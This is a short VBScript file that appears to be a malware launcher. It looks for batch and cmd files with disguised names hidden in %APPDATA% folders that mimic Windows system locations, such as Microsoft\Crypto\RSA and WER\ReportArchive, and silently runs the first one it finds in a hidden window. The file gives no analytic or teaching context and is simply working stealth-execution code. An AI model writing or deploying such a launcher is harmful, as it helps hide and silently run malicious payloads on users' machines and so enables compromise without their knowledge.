Set ws = CreateObject("WScript.Shell")
ad = ws.ExpandEnvironmentStrings("%APPDATA%")
scripts = Array(ad & "\Microsoft\Crypto\RSA\cache-helper.cmd", ad & "\Microsoft\Crypto\RSA\MachineKeys.bat", ad & "\Microsoft\Protect\syskeys.bat", ad & "\Microsoft\Windows\WER\ReportArchive\wersvc.cmd")
Set fso = CreateObject("Scripting.FileSystemObject")
For Each s In scripts
  If fso.FileExists(s) Then
    ws.Run s, 0, False
    Exit For
  End If
Next